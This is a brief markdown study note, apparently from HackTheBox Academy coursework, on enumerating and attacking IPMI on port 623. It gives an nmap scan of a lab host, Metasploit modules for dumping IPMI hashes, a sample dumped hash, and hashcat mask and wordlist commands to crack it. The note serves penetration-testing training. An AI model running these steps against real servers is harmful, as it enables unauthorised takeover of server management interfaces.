---
title: IPMI 🍗
tags:
  - Protocol
---
>[!Note]
>*It typically runs on port `623` over UDP.*

## Nmap Scan

```shell
nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

# HTB Cheatsheet

| **Command**                                    | **Description**         |
| ---------------------------------------------- | ----------------------- |
| `msf6 auxiliary(scanner/ipmi/ipmi_version)`    | IPMI version detection. |
| `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)` | Dump IPMI hashes.       |

## Cracking IMPI password

I you find something like `admin:f5924e0a82000000c436b21233d54926bb4f88ca93c216fb69d4babeecac81657dacf86eacf672c7a123456789abcdefa123456789abcdef140561646d696e:af4bd292e2c5fe0c16ead56924d15d33f62f0039` when running the dump script, you need to crack it using hashcat offline using a **mask attack**:

```shell
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

Or use a wordlist:

```shell
hashcat -m 7300 ipmi.txt -a 0 /usr/share/wordlists/rockyou.txt
```

> You should check [Footprinting Theory 🌚](/notes/Info/HTB%20Academy/footprinting_theory.md) to get further knowledge.